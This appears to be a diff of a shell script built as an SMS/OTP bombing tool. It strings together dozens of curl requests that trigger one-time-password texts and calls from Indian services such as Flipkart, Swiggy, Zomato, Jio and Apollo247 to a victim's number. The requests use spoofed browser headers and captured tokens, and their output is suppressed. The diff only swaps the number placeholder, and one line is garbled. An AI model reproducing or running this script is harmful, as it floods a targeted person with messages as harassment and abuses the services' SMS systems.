@@ -14,7 +14,7 @@ curl -X POST 'https://www.dealshare.in/api/1.0/get-otp' \
   -H 'sec-fetch-mode: cors' \
   -H 'sec-fetch-site: same-origin' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
-  --data-raw '{"phoneNumber":"$tor","name":"","hashCode":"","resendOtp":0,"source":"web"}' \
+  --data-raw '{"phoneNumber":"€tor","name":"","hashCode":"","resendOtp":0,"source":"web"}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -33,7 +33,7 @@ curl -X POST 'https://webapi.apollo247.com/' \
   -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
   -H 'sec-ch-ua-mobile: ?0' \
   -H 'sec-ch-ua-platform: "Windows"' \
-  --data-raw $'{"operationName":"Login","variables":{"mobileNumber":"+91$tor","loginType":"PATIENT"},"query":"query Login($mobileNumber: String\u0021, $loginType: LOGIN_TYPE\u0021) {\\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\\n    status\\n    message\\n    loginId\\n    __typename\\n  }\\n}\\n"}' \
+  --data-raw $'{"operationName":"Login","variables":{"mobileNumber":"+91€tor","loginType":"PATIENT"},"query":"query Login($mobileNumber: String\u0021, $loginType: LOGIN_TYPE\u0021) {\\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\\n    status\\n    message\\n    loginId\\n    __typename\\n  }\\n}\\n"}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -53,7 +53,7 @@ curl -X POST 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
   -H 'sec-fetch-site: same-origin' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   -H 'x-platform: 0' \
-  --data-raw '{"phone":"$tor","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}' \
+  --data-raw '{"phone":"€tor","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -65,7 +65,7 @@ curl -X POST 'https://login.web.ajio.com/api/auth/generateLoginOTP' \
   -H 'sec-ch-ua-mobile: ?0' \
   -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   -H 'sec-ch-ua-platform: "Windows"' \
-  --data-raw '{"mobileNumber":"$tor"}' \
+  --data-raw '{"mobileNumber":"€tor"}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -82,7 +82,7 @@ curl -X POST 'https://api.penpencil.co/v1/users/resend-otp?smsType=1' \
   -H 'client-id: 5eb393ee95fab7468a79d189' \
   -H 'Client-Type: WEB' \
   -H 'sec-ch-ua-platform: "Windows"' \
-  --data-raw '{"mobile":"$tor","organizationId":"5eb393ee95fab7468a79d189"}' \
+  --data-raw '{"mobile":"€tor","organizationId":"5eb393ee95fab7468a79d189"}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -108,7 +108,7 @@ curl -X POST 'https://www.1mg.com/auth_api/v6/create_token' \
   -H 'x-csrf-token: qsV9AIy4-C0GI9ppMcea042GtPQ8WRA6AhlE' \
   -H 'x-html-canrender: True' \
   -H 'x-platform: Desktop-0.0.1' \
-  --data-raw '{"number":"$tor","is_corporate_user":false,"is_doctor":false}' \
+  --data-raw '{"number":"€tor","is_corporate_user":false,"is_doctor":false}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -135,7 +135,7 @@ curl -X POST 'https://www.1mg.com/auth_api/v6/create_token' \
   -H 'x-csrf-token: qsV9AIy4-C0GI9ppMcea042GtPQ8WRA6AhlE' \
   -H 'x-html-canrender: True' \
   -H 'x-platform: Desktop-0.0.1' \
-  --data-raw '{"number":"$tor","is_corporate_user":false,"otp_on_call":true}' \
+  --data-raw '{"number":"€tor","is_corporate_user":false,"otp_on_call":true}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -155,7 +155,7 @@ curl -X POST 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
   -H 'sec-fetch-site: same-origin' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   -H 'x-platform: 0' \
-  --data-raw '{"phone":"$tor","country_code":"IN","otp_type":2,"email":"","send_otp":true,"is_un_teach_user":false}' \
+  --data-raw '{"phone":"€tor","country_code":"IN","otp_type":2,"email":"","send_otp":true,"is_un_teach_user":false}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -175,7 +175,7 @@ curl -X POST 'https://www.jio.com/api/jio-login-service/login/sendOtp' \
   -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
   -H 'sec-ch-ua-mobile: ?0' \
   -H 'sec-ch-ua-platform: "Windows"' \
-  --data-raw '{"mobileNumber":"$tor","loginFlowType":"MOBILE","alternateNumber":""}' \
+  --data-raw '{"mobileNumber":"€tor","loginFlowType":"MOBILE","alternateNumber":""}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -193,7 +193,7 @@ curl -X POST 'https://webapi.apollo247.com/' \
   -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
   -H 'sec-ch-ua-mobile: ?0' \
   -H 'sec-ch-ua-platform: "Windows"' \
-  --data-raw $'{"operationName":"getOTPOnCall","variables":{"mobileNumber":"+91$tor","loginType":"PATIENT","id":"0c3f4d50-b054-11ed-9846-7b73ab120606"},"query":"query getOTPOnCall($mobileNumber: String, $loginType: LOGIN_TYPE, $id: String\u0021) {\\n  getOTPOnCall(mobileNumber: $mobileNumber, loginType: $loginType, id: $id) {\\n    status\\n    loginId\\n    message\\n    __typename\\n  }\\n}\\n"}' \
+  --data-raw $'{"operationName":"getOTPOnCall","variables":{"mobileNumber":"+91€tor","loginType":"PATIENT","id":"0c3f4d50-b054-11ed-9846-7b73ab120606"},"query":"query getOTPOnCall($mobileNumber: String, $loginType: LOGIN_TYPE, $id: String\u0021) {\\n  getOTPOnCall(mobileNumber: $mobileNumber, loginType: $loginType, id: $id) {\\n    status\\n    loginId\\n    message\\n    __typename\\n  }\\n}\\n"}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -213,7 +213,7 @@ curl -X POST 'https://1.rome.api.flipkart.com/api/7/user/otp/generate' \
   -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
   -H 'sec-ch-ua-mobile: ?0' \
   -H 'sec-ch-ua-platform: "Windows"' \
-  --data-raw '{"loginId":"+91$tor"}' \
+  --data-raw '{"loginId":"+91€tor"}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -239,7 +239,7 @@ curl -X POST 'https://www.1mg.com/auth_api/v6/create_token' \
   -H 'x-csrf-token: qsV9AIy4-C0GI9ppMcea042GtPQ8WRA6AhlE' \
   -H 'x-html-canrender: True' \
   -H 'x-platform: Desktop-0.0.1' \
-  --data-raw '{"number":"$tor","is_corporate_user":false,"otp_on_call":true}' \
+  --data-raw '{"number":"€tor","is_corporate_user":false,"otp_on_call":true}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -261,7 +261,7 @@ curl -X POST 'https://pharmeasy.in/apt-api/login/send-otp' \
   -H 'x-instana-l: 1,correlationType=web;correlationId=b93fcd3cc87cdd26' \
   -H 'x-instana-s: b93fcd3cc87cdd26' \
   -H 'x-instana-t: b93fcd3cc87cdd26' \
-  --data-raw '{"param":"$tor"}' \
+  --data-raw '{"param":"€tor"}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -281,7 +281,7 @@ curl -X POST 'https://accounts.zomato.com/login/phone' \
   -H 'sec-fetch-site: same-origin' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   -H 'x-zomato-csrft;' \
-  --data-raw $'------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="country_id"\r\n\r\n1\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="number"\r\n\r\n$tor\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="type"\r\n\r\ninitiate\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="hash"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="id_token"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="fb_token"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="email"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="name"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="otp"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="csrf_token"\r\n\r\naaa1e77cff99a5e93f1391bb9f43e0db\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="lc"\r\n\r\n400c6068d99947e6a3f5c8245e627cf9\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="verification_type"\r\n\r\nsms\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="message_uuid"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="theme"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i--\r\n' \
+  --data-raw $'------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="country_id"\r\n\r\n1\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="number"\r\n\r\n€tor\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="type"\r\n\r\ninitiate\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="hash"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="id_token"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="fb_token"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="email"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="name"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="otp"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="csrf_token"\r\n\r\naaa1e77cff99a5e93f1391bb9f43e0db\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="lc"\r\n\r\n400c6068d99947e6a3f5c8245e627cf9\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="verification_type"\r\n\r\nsms\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="message_uuid"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i\r\nContent-Disposition: form-data; name="theme"\r\n\r\n\r\n------WebKitFormBoundarywon1ZNqyBEuGcv9i--\r\n' \
   --compressed  > /dev/null 2>&1
 
 
@@ -301,7 +301,7 @@ curl -X POST 'https://www.swiggy.com/dapi/auth/sms-otp' \
   -H 'sec-fetch-mode: cors' \
   -H 'sec-fetch-site: same-origin' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
-  --data-raw '{"mobile":"$tor","_csrf":"4QfCUHREQUpv-blC01cQBRzTY41dSeJGH30alxjQ"}' \
+  --data-raw '{"mobile":"€tor","_csrf":"4QfCUHREQUpv-blC01cQBRzTY41dSeJGH30alxjQ"}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -320,7 +320,7 @@ curl -X POST 'https://mtnucleus.byjusweb.com/api/acs/v2/send-otp' \
   -H 'sec-fetch-mode: cors' \
   -H 'sec-fetch-site: cross-site' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
-  --data-raw '{"phoneNumber":"$tor","page":"free-trial-classes"}' \
+  --data-raw '{"phoneNumber":"€tor","page":"free-trial-classes"}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -339,7 +339,7 @@ curl -X POST 'https://api.sso.masaischool.com/mobile-signup-send-otp' \
   -H 'sec-fetch-mode: cors' \
   -H 'sec-fetch-site: same-site' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
-  --data-raw '{"mobileNumber":"+91$tor","name":"kalwar"}' \
+  --data-raw '{"mobileNumber":"+91€tor","name":"kalwar"}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -359,7 +359,7 @@ curl -X POST 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
   -H 'sec-fetch-site: same-origin' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   -H 'x-platform: 0' \
-  --data-raw '{"phone":"$tor","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}' \
+  --data-raw '{"phone":"€tor","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -379,7 +379,7 @@ curl -X POST 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
   -H 'sec-fetch-site: same-origin' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   -H 'x-platform: 0' \
-  --data-raw '{"phone":"$tor","country_code":"IN","otp_type":2,"email":"","send_otp":true,"is_un_teach_user":false}' \
+  --data-raw '{"phone":"€tor","country_code":"IN","otp_type":2,"email":"","send_otp":true,"is_un_teach_user":false}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -396,7 +396,7 @@ curl -X POST 'https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d18
   -H 'client-id: 5eb393ee95fab7468a79d189' \
   -H 'client-type: WEB' \
   -H 'sec-ch-ua-platform: "Windows"' \
-  --data-raw '{"mobile":"$tor","countryCode":"+91","firstName":"cxvzv"}' \
+  --data-raw '{"mobile":"€tor","countryCode":"+91","firstName":"cxvzv"}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -413,7 +413,7 @@ curl -X POST 'https://api.penpencil.co/v1/users/resend-otp?smsType=1' \
   -H 'client-id: 5eb393ee95fab7468a79d189' \
   -H 'Client-Type: WEB' \
   -H 'sec-ch-ua-platform: "Windows"' \
-  --data-raw '{"mobile":"$tor","organizationId":"5eb393ee95fab7468a79d189"}' \
+  --data-raw '{"mobile":"€tor","organizationId":"5eb393ee95fab7468a79d189"}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -437,7 +437,7 @@ curl -X POST 'https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone' 
   -H 'utm_medium;' \
   -H 'utm_source;' \
   -H 'utm_term;' \
-  --data-raw '{"phoneNumber":"+91$tor"}' \
+  --data-raw '{"phoneNumber":"+91€tor"}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -456,7 +456,7 @@ curl -X POST 'https://user.vedantu.com/user/preLoginVerification' \
   -H 'sec-fetch-mode: cors' \
   -H 'sec-fetch-site: same-site' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
-  --data-raw '{"email":null,"phoneCode":"+91","phoneNumber":"$tor","version":2,"ver":"12.336"}' \
+  --data-raw '{"email":null,"phoneCode":"+91","phoneNumber":"$€tor","version":2,"ver":"12.336"}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -475,7 +475,7 @@ curl -X POST 'https://api.doubtnut.com/v4/student/login' \
   -H 'sec-fetch-site: same-site' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   -H 'version_code: 1500' \
-  --data-raw 'phone_number=$tor&is_web=3' \
+  --data-raw 'phone_number=€tor&is_web=3' \
   --compressed  > /dev/null 2>&1
 
 
@@ -496,7 +496,7 @@ curl -X POST 'https://api.tatadigital.com/api/v2/sso/check-phone' \
   -H 'sec-fetch-mode: cors' \
   -H 'sec-fetch-site: cross-site' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
-  --data-raw '{"countryCode":"91","phone":"$tor","sendOtp":true}' \
+  --data-raw '{"countryCode":"91","phone":"€tor","sendOtp":true}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -516,7 +516,7 @@ curl -X POST 'https://auth.zee5.com/v1/user/sendotp' \
   -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
   -H 'sec-ch-ua-mobile: ?0' \
   -H 'sec-ch-ua-platform: "Windows"' \
-  --data-raw '{"phoneno":"91$tor"}' \
+  --data-raw '{"phoneno":"91€tor"}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -539,7 +539,7 @@ curl -X POST 'https://www.dunzo.com/api/v0/auth/sign-up' \
   -H 'x-app-type: PWA_WEB' \
   -H 'x-app-version: 2.0.0' \
   -H 'x-csrf-token: MCVoy4ET-I18Jva1CJx9lZyB82ZzZ_KwYEoU' \
-  --data-raw '{"phone":"$tor","tos_accepted":true}' \
+  --data-raw '{"phone":"€tor","tos_accepted":true}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -559,7 +559,7 @@ curl -X POST 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
   -H 'sec-fetch-site: same-origin' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   -H 'x-platform: 0' \
-  --data-raw '{"phone":"$tor","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}' \
+  --data-raw '{"phone":"€tor","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -577,7 +577,7 @@ curl -X POST 'https://webapi.apollo247.com/' \
   -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
   -H 'sec-ch-ua-mobile: ?0' \
   -H 'sec-ch-ua-platform: "Windows"' \
-  --data-raw $'{"operationName":"getOTPOnCall","variables":{"mobileNumber":"+91$tor","loginType":"PATIENT","id":"0c3f4d50-b054-11ed-9846-7b73ab120606"},"query":"query getOTPOnCall($mobileNumber: String, $loginType: LOGIN_TYPE, $id: String\u0021) {\\n  getOTPOnCall(mobileNumber: $mobileNumber, loginType: $loginType, id: $id) {\\n    status\\n    loginId\\n    message\\n    __typename\\n  }\\n}\\n"}' \
+  --data-raw $'{"operationName":"getOTPOnCall","variables":{"mobileNumber":"+91€tor","loginType":"PATIENT","id":"0c3f4d50-b054-11ed-9846-7b73ab120606"},"query":"query getOTPOnCall($mobileNumber: String, $loginType: LOGIN_TYPE, $id: String\u0021) {\\n  getOTPOnCall(mobileNumber: $mobileNumber, loginType: $loginType, id: $id) {\\n    status\\n    loginId\\n    message\\n    __typename\\n  }\\n}\\n"}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -603,7 +603,7 @@ curl -X POST 'https://webrouter-bbe-prod.angelbroking.com/login/v3/generateLogin
   -H 'x-sourceid: 3' \
   -H 'x-systeminfo;' \
   -H 'x-usertype: 1' \
-  --data-raw '{"country_code":"+91","mob_no":"$tor","is_otp_resend":false,"user_id":""}' \
+  --data-raw '{"country_code":"+91","mob_no":"€tor","is_otp_resend":false,"user_id":""}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -620,7 +620,7 @@ curl -X POST 'https://customer.rapido.bike/api/otp' \
   -H 'sec-fetch-dest: empty' \
   -H 'sec-fetch-mode: cors' \
   -H 'sec-fetch-site: same-site' \
-  --data-raw '{"mobile":"$tor"}' \
+  --data-raw '{"mobile":"€tor"}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -638,7 +638,7 @@ curl -X POST 'https://api.gopaysense.com/users/otp' \
   -H 'sec-fetch-mode: cors' \
   -H 'sec-fetch-site: same-site' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
-  --data-raw '{"phone":"$tor"}' \
+  --data-raw '{"phone":"€tor"}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -660,7 +660,7 @@ curl -X POST 'https://www.medibuddy.in/unified-login/user/register' \
   -H 'traceparent: 00-1a002fe583a589eccfa079b106efa760-5d41d1461ff0543a-01' \
   -H 'tracestate: 3364160@nr=0-1-3364160-322548686-5d41d1461ff0543a----1677007490677' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
-  --data-raw '{"source":"medibuddy","platform":"medibuddyInWeb","phonenumber":"$tor","screen":"login-page","advertiserId":"1052940192611150823","mbUserId":null}' \
+  --data-raw '{"source":"medibuddy","platform":"medibuddyInWeb","phonenumber":"€tor","screen":"login-page","advertiserId":"1052940192611150823","mbUserId":null}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -675,7 +675,7 @@ curl -X POST 'https://apinew.moglix.com/nodeApi/v1/login/sendOTP' \
   -H 'x-access-token;' \
   -H 'x-request-id: 9KBqSaqWkg5-odqZr1bAAbpYcJDDtI98' \
   -H 'sec-ch-ua-platform: "Windows"' \
-  --data-raw '{"phone":"$tor","email":"","type":"p","source":"signup","device":"mobile"}' \
+  --data-raw '{"phone":"€tor","email":"","type":"p","source":"signup","device":"mobile"}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -703,7 +703,7 @@ curl -X POST 'https://www.airbnb.co.in/api/v2/phone_one_time_passwords?key=d306z
   -H 'x-csrf-token: null' \
   -H 'x-csrf-without-token: 1' \
   -H 'x-requested-with: XMLHttpRequest' \
-  --data-raw '{"phoneNumber":"91$tor","workFlow":"GLOBAL_SIGNUP_LOGIN","otpMethod":"WHATSAPP","accountIdentifier":"","accountIdentifierType":"PHONE"}' \
+  --data-raw '{"phoneNumber":"91€tor","workFlow":"GLOBAL_SIGNUP_LOGIN","otpMethod":"WHATSAPP","accountIdentifier":"","accountIdentifierType":"PHONE"}' \
   --compressed  > /dev/null 2>&1
 
 
@@ -723,7 +723,7 @@ curl -X POST 'https://api.doubtnut.com/v4/student/login' \
   -H 'sec-fetch-site: same-site' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   -H 'version_code: 1500' \
-  --data-raw 'phone_number=$tor&is_web=3' \
+  --data-raw 'phone_number=€tor&is_web=3' \
   --compressed  > /dev/null 2>&1
 
 
@@ -741,6 +741,6 @@ curl -X POST 'https://www.gamezy.com/api/auth/getOTP' \
   -H 'sec-fetch-dest: empty' \
   -H 'sec-fetch-mode: cors' \
   -H 'sec-fetch-site: same-origin' \
-  --data-raw '{"verificationChannel":"2","mobile":"$tor"}' \
+  --data-raw '{"verificationChannel":"2","mobile":"€tor"}' \
   --compressed  > /dev/null 2>&1
 
